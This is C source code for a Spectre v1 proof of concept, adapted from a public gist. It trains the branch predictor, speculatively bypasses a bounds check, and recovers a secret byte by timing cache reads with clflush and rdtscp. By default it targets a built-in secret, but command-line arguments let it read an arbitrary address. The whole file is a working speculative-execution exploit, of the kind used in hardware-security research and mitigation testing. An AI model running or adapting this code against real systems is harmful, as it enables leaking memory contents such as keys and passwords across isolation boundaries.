#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
#define STALL_ITERS 100

/*
 * Spectre v1 attack code adapted from Erik August's version at
 * https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6
 * 
 * Speculatively bypasses a bounds check to leak a register-based secret
 * through the d-cache.
 * /

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 256;
uint8_t unused1[64];
uint8_t array1[256] = {0};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char * secret = "*";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x, int *condition) {
  uint8_t *secret_addr = array2 + array1[x] * 512;
  _mm_clflush(condition);

  for (volatile int z = 0; z < STALL_ITERS; z++) {};

  if (*condition) {
    temp &= *secret_addr;
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

#define NUM_TRIALS 1

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  uint64_t average_times[256];
  volatile uint8_t * addr;
  int condition;

  for (i = 0; i < 256; i++) {
    results[i] = 0;
    average_times[i] = 0;
  }
  for (tries = NUM_TRIALS; tries > 0; tries--) {
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 6; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));
      condition = !x;

      /* Call the victim! */
      victim_function(x, &condition);

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = & array2[mix_i * 512];
            time1 = __rdtscp( & junk); /* READ TIMER */
            junk = * addr; /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            average_times[mix_i] += time2;
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
  }

  
  printf("guess,cycles\n");
  for (int i = 0; i < 256; i++) {
    average_times[i] /= NUM_TRIALS;
    printf("%i,%lu\n", i, average_times[i]);
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  /* int i, score[2], len = 40; */
  int i, score[2], len = 1;
  uint8_t value[2];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  if (argc == 3) {
    sscanf(argv[1], "%p", (void * * )( & malicious_x));
    malicious_x -= (size_t) array1; /* Convert input value into a pointer */
    sscanf(argv[2], "%d", & len);
  }

  readMemoryByte(malicious_x++, value, score);
  if (value[0] == secret[0]) {
    fprintf(stderr, "Attack succeeded. Secret correctly guessed as %d\n", value[0]);
  } else {
    fprintf(stderr, "Attack failed. Could not determine the secret (%d)\n", secret[0]);
  }
  return (0);
}
